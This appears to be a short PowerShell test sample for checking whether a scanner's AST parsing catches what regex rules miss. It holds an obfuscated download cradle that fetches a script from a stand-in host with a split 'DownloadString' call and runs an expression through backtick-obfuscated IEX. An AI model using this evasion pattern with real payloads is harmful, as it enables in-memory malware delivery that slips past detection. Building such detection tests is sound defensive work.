# Obfuscated Dynamic Memory Cradle (Tests AST parser vs regex evasion)
$wc = New-Object System.Net.WebClient
$wc.('Down' + 'load' + 'String').Invoke('http://suspicious-endpoint.local/stage.ps1')
& (`I`Ex) ('Write-Host "Unpacked Memory Stage"')
